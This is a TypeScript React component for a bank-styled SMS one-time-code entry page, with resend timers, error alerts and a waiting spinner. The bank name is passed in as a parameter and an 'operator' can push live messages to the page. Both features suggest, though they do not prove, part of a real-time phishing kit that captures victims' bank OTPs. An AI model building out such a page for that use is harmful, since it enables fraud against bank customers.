import React, { useState, useEffect } from "react";
import type { OperatorMessage as OperatorMessageType, ResendState } from "../../types";
import { Spinner } from "../../components/spinner";

interface SmsOtpProps {
  bank?: string;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
  onSubmit: (code: string) => void;
  submitting: boolean;
  resendState: ResendState;
  resetKey: number;
}

export function SmsOtp({
  bank,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  onSubmit,
  submitting,
  resendState,
  resetKey,
}: SmsOtpProps) {
  const [code, setCode] = useState("");

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setCode("");
    }
  }, [wrongCode, expiredCode]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = code.replace(/\D/g, "").slice(0, 6);
    if (trimmed.length < 6) return;
    onSubmit(trimmed);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      <h2 className="bank-ui-heading">Enter verification code</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter the OTP sent by ${bank} to your registered mobile number.`
          : "Please enter the OTP sent to your registered mobile number."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="otp-code" className="bank-ui-label">
            Verification code
          </label>
          <input
            id="otp-code"
            key={resetKey}
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            disabled={submitting}
            placeholder="000000"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting || code.replace(/\D/g, "").length < 6}
          className="bank-ui-btn"
        >
          Submit
        </button>
      </form>
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend SMS"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend SMS in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
